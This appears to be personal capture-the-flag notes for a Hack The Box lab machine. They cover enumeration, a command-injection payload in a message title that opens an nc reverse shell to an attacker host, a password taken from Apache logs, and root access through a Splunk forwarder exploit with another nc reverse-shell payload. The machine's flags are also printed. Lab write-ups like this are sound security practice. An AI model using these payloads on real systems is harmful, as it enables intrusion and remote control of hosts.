<pre>
Machine IP: 10.10.10.209

Enum:
    Open ports:
22/tcp   open  ssh      
80/tcp   open  ssl/http Apache/2.4.41 (Ubuntu)
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Splunkd


Go to the /etc/hosts and add:
    10.10.10.209    doctors.htb
http://doctors.htb/login?next=%2F => login page

    Go to register and create an account!
Go to new message change title with a new one and go for reverse shell:
    `<im g src=http://boxip/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'attackbox'$IFS’attaport')>`
    $ nc -lvnp 9003


User flag:
$ cd    /var/log/apache2
$ backup
$ grep -r password?email
    *backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
$su shaun
$ password: Guitar123
User flag: /home/shaun

Priv Esc:
    *First download https://github.com/cnotin/SplunkWhisperer2 from git on your machine
    ! Make a nc listener 

    $ python PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.89 --username shaun --password Guitar123 --payload "nc.traditional -e /bin/sh '10.10.14.89' '9002'"

    And got root!


User Flag: 006485ecedf8ff72b584ca87e57c0532
Root Flag: 267ebad127e4cc676902b28cfb61a711
</pre>
